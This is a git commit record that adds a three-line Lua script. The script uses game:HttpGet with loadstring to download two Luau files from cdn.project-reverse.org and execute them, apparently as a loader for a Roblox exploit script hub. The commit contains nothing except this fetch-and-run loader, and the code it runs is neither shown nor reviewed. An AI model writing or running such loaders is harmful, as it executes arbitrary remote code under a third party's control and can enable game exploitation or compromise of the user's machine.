4c13bdfc20084b92417b4d6dd9e8183198da44b0
xlolo30127 <lolo30127aaaa@outlook.fr>
2026-05-11 10:47:25 -0700

    Add script_kFVe3GZl_1778521643650.lua

---
+++ script_kFVe3GZl_1778521643650.lua
@@ -0,0 +1,3 @@
+ID="8b58aee2-fae8-4db3-b3cc-16712baa7061";
+RUN_AFTER=loadstring(game:HttpGet("https://cdn.project-reverse.org/overdrive_main.luau"));
+loadstring(game:HttpGet("https://cdn.project-reverse.org/loader.luau"))();
